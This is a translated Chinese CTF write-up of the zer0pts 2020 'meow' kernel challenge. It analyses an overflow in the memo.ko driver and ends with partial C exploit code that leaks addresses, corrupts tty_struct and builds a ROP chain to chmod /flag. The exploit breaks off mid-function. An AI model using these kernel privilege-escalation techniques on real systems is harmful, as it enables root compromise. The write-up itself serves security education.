# 2020-zer0ptsCTF-meow
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 信息收集
start.sh qemu 启动脚本如下：
    #!/bin/sh
    qemu-system-x86_64 
        -m 256M 
        -kernel ./bzImage 
        -initrd ./rootfs.cpio 
        -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet" 
        -cpu kvm64,+smep,+smap 
        -monitor /dev/null 
        -nographic -s
可见开启了 SMEP、SMAP、KASLR；
参数 `-cpu kvm64,+smep` 表示开启了KPTI，关于查看KPTI是否开启还有如下方法：
    / # dmesg | grep 'page table'
    [    0.712632] Kernel/User page tables isolation: enabled
    / # cat /proc/cpuinfo | grep pti
    fpu_exception    : yes
    flags        : ... pti smep smap
提取文件系统后查看目标驱动和内核保护：
    $ checksec vmlinux
    [*] '/home/ivan/kernel/meow/vmlinux'
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0xffffffff81000000)
        RWX:      Has RWX segments
    $ checksec memo.ko
    [*] '/home/ivan/kernel/meow/memo.ko'
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x0)
init 系统启动脚本如下：
    #!/bin/sh
    # devtmpfs does not get automounted for initramfs
    /bin/mount -t proc proc /proc
    /bin/mount -t sysfs sysfs /sys
    /bin/mount -t devtmpfs devtmpfs /dev
    /sbin/mdev -s
    mkdir -p /dev/pts
    mount -vt devpts -o gid=4,mode=620 none /dev/pts
    chmod 666 /dev/ptmx
    echo 1 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    chown root:root /flag
    chmod 400 /flag
    insmod /root/memo.ko
    mknod -m 666 /dev/memo c `grep memo /proc/devices | awk '{print $1;}'` 0
    echo -e "nBoot took $(cut -d' ' -f1 /proc/uptime) secondsn"
    cat /root/banner
    setsid /bin/cttyhack setuidgid 1000 /bin/sh
    umount /proc
    umount /sys
    poweroff -d 0 -f
可见开启了`kptr_restrict`并且禁用了`dmesg`
查看目标内核版本：
    / $ cat /proc/version
    Linux version 4.19.98 (ptr@medium-pwn) (gcc version 8.3.0 (Buildroot 2019.11-git-00204-gc2417843c8)) #2 SMP Wed Feb 5 21:57:51 JST 2020
## 环境搭建
在用 `make menuconfig` 配置 `.config` 前，先用 `make defconfig` 创建一个默认配置的 `.config`
文件。否则 `make menuconfig` 会先在 `/boot/` 目录中查找之前的`.config`文件：
    $ make menuconfig
    scripts/kconfig/mconf  Kconfig
    #
    # using defaults found in /boot/config-5.3.0-40-generic
    #
    ...
## 关键函数分析&漏洞点
`mod_write`: 首先通过 `fd->f_pos`获取文件当前的读写位置，要求 `pos` 小于0x400，之后会以
`pos`为偏移向内核内存空间中写入给定长度的`buf` 数据。
    unsigned __int64 __fastcall mod_write(__int64 fd, __int64 buf, unsigned __int64 ntype, _QWORD *offset)
    {
      unsigned __int64 pos; // rdi
      unsigned __int64 result; // rax
      _QWORD *v6; // rbp
      unsigned __int64 v7; // rbx
      pos = *(_QWORD *)(fd + 104);                  // fd->f_pos
      result = 0LL;
      if ( pos  0x400 )
          v7 = 0x400LL - *offset;
        if ( copy_from_user(&memo[pos], buf, v7) )
        {
          result = -14LL;
        }
        else
        {
          *v6 += v7;
          result = v7;
        }
      }
      return result;
    }
`mod_llseek`：主要作用为更新 `fd->pos`的值，当 whence 为 1 时，将文件位置设置为当前位置加上偏移；当 whence 为 2
时，设置文件位置为堆块大小加上偏移字节。
    signed __int64 __fastcall mod_llseek(__int64 fd, signed __int64 offset, int whence)
    {
      signed __int64 result; // rax
      if ( whence == 1 )
      {
        result = offset + *(_QWORD *)(fd + 104);
      }
      else if ( whence == 2 )
      {
        result = offset + strlen(memo);
      }
      else
      {
        if ( whence )
          return -22LL;
        result = offset;
      }
      if ( result f_pos` 的值，代码如下：
    //fs/read_write.c#L592
    ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
    {
        struct fd f = fdget_pos(fd);
        ssize_t ret = -EBADF;
        if (f.file) {
            loff_t pos = file_pos_read(f.file);
            ret = vfs_write(f.file, buf, count, &pos);
            if (ret >= 0)
                file_pos_write(f.file, pos);
            fdput_pos(f);
        }
        return ret;
    }
    //fs/read_write.c#L566
    static inline void file_pos_write(struct file *file, loff_t pos)
    {
        if ((file->f_mode & FMODE_STREAM) == 0)
            file->f_pos = pos;
    }
返回题目中的代码，可以发现：若第一次写入 0x3FF 大小数据 ，`fd->pos=0x3FF`，第二次写入时的 `fd->pos`值还是 0x3FF
，通过验证，而堆块大小为0x400，造成了堆溢出。可以通过 `mod_read()` ， `mod_write()` 实现越界读写。
> 在搭建环境时发现，若内核在编译前加上 `CONFIG_HARDENED_USERCOPY=y` ，则会在 `copy_from_user,
> copy_to_user` 前加上 `check_object_size(from, n, true);`
> 这样一个检查，作用是验证地址有效性、检查是否有堆栈或SLAB的越界读写。即使出现题目中的堆溢出，也只能造成crash，无法利用。  
>  编译前加上 `CONFIG_SLAB_FREELIST_HARDENED=y`，free_list中指针会以 `ptr ^ s->random ^
> ptr_addr` 这种方式进行混淆，从而导致无法泄露堆地址；但该保护措施有缺陷可以绕过，详见参考[4]。
## 方法一
###  利用思路
起初的思路是堆溢出修改 `tty_struct` 劫持 `ioctl` 指针，覆写cr4 关闭 SMEP、SMAP后，进行栈迁移直接ret2usr。但在编写
ROP chain 时发现当调用用户态代码的时候内核会报如下错误 ：`BUG: unable to handle kernel paging request
at 0000000000400eaa`。关闭 KPTI 后，exp能成功执行。印象中的 KPTI
将用户空间页表与内核空间页表进行了隔离，但最终目的是为了防止用户空间获取内核数据。查看官方文档后（参考[5]），发现下面一段话：
> Another potential vulnerability comes about if the kernel can ever be
> manipulated into returning to user space without switching back to the
> sanitized PGD. Since the kernel-space PGD also maps user-space memory, such
> an omission could go unnoticed for some time. The response here is to map
> the user-space portion of the virtual address space as non-executable in the
> kernel PGD. Should user space ever start running with the wrong page tables,
> it will immediately crash as a result.
即在KPTI中，所有用户空间页面都以 NX （不可执行）映射到内核页面表中。 实现了与SMEP非常相似的功能。
虽然限制了不能执行用户空间的代码，但仍然可以将内核栈迁移到用户空间中 。这里只是为了获取 flag 的值，可以不用获得一个交互shell，只需将 flag
权限修改为 777 ，之后让程序 sleep 0x1000000 秒 ，这样做的好处是，就算程序在退出前崩溃也可以在 sleep 的时间内去获取 flag
值。:)
###  exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNELCALL __attribute__ ((regparm(3)))
    void (* commit_creds)(void *) KERNELCALL;
    size_t* (* prepare_kernel_cred)(void *) KERNELCALL;
    size_t commit_creds_addr=0,prepare_kernel_cred_addr=0;
    struct skewBuf{
        unsigned char padding;
        unsigned long vec[127];
        unsigned char pading[7];
    } __attribute__((packed));
    void info(const char *fmt, ...) {
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[.] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void msg(const char *fmt, ...) {
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[*] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
    }
    void fail(const char *fmt, ...) {
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[x] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
        exit(1);
    }
    size_t user_cs, user_ss, user_rflags, user_sp;
    void save_status()
    {
            //info("saving status...n");
            __asm__("mov user_cs, cs;"
                            "mov user_ss, ss;"
                            "mov user_sp, rsp;"
                            "pushf;"
                            "pop user_rflags;"
                            );
            //msg("status has been savedn");
    }
    void mod_write(int fd,void* buf,size_t nbyte){
        size_t result;
        //info("mod_write ... n");
        result = write(fd,buf,nbyte);
        if(result<=0){
            fail("mod_write failed!n");
            exit(-1);
        }
    }
    void mod_llseek(int fd,off_t offset, int whence){
        size_t result;
        //info("mod_llseek ... n");
        result = lseek(fd,offset,whence);
        //msg("mod_llseek result:0x%lxn",result);
    }
    void mod_read(int fd,void *buf,size_t nbyte){
        size_t result;
        //info("mod_read ... n");
        result = read(fd,buf,nbyte);
        if(result<=0){
            fail("mod_read failed!n");
            exit(-1);
        }
    }
    size_t vmlinux_base = 0;
    size_t raw_vmlinux_base = 0xffffffff81000000;
    size_t raw_do_tty_hangup = 0xffffffff8140f6b0; 
    size_t raw_commit_creds = 0xffffffff8107b8b0; 
    size_t raw_prepare_kernel_cred = 0xffffffff8107bb50;
    size_t raw_regcache_mark_dirty = 0xffffffff81588fd0;
    size_t raw_x64_sys_chmod = 0xffffffff8119fcd0;
    size_t raw_msleep = 0xffffffff810c4740;
    size_t raw_pop_rdi = 0xffffffff81001268; //pop rdi; ret;
    size_t raw_pop_rdx = 0xffffffff81043137; //pop rdx; ret;
    size_t raw_pop_rcx = 0xffffffff8104c852; //pop rcx; ret;
    size_t raw_mov_rdi_rax = 0xffffffff810cecce; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; 
    size_t raw_pop_rax = 0xffffffff81023301;//pop rax; ret;
    size_t raw_mov_rdi_rbx = 0xffffffff827862bc; //mov rdi, rbx; call rax;
    size_t raw_pop_rsi = 0xffffffff81001b79; //pop rsi; ret;
    size_t raw_push_rax =  0xffffffff81022353;//push rax; ret;
    size_t raw_pop_rdi_call = 0xffffffff81f234e2; //pop rdi; call rcx;
    size_t base_add(size_t addr){
        return addr - raw_vmlinux_base + vmlinux_base;
    }
    int main(){
        char tmp_buf[0x3ff];
        struct skewBuf buf;
        int i;
        size_t rop[0x50];
        char* flag_str = "/flag";
        save_status();
               size_t fd = open("/dev/memo",O_RDWR);
        if(fd == -1){
            fail("memo open failed!n");
        }
        memset(tmp_buf,'A',sizeof(tmp_buf));
        mod_write(fd,tmp_buf,sizeof(tmp_buf));
        mod_read(fd,&buf,sizeof(buf));
        size_t heap_addr = buf.vec[0]-0x400;
        msg("leak heap addr: %pn",(void*)heap_addr);
        size_t tty_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if(tty_fd == -1){
            fail("ptmx open failed!n");
        }
        mod_llseek(fd,0x3ff,0);
        mod_read(fd,&buf,sizeof(buf));
        size_t do_tty_hangup = buf.vec[0x4a];
        vmlinux_base = do_tty_hangup - raw_do_tty_hangup + raw_vmlinux_base;
        msg("do_tty_hangup addr: %pn",(void*)do_tty_hangup);
        msg("vmlinux_base addr: %pn",(void*)vmlinux_base);
        mod_llseek(fd,0x3ff,0);
        size_t rop_base = heap_addr+0x2e0;
        buf.vec[3] = rop_base;
        buf.vec[0x2e0/8+0xc] = base_add(raw_regcache_mark_dirty);//ioctl
        buf.vec[0x20/8] = base_add(raw_mov_cr4_rdi);
        buf.vec[0x30/8] = 0x6f0;
        size_t xchg_eax_esp = base_add(raw_xchg_eax_esp);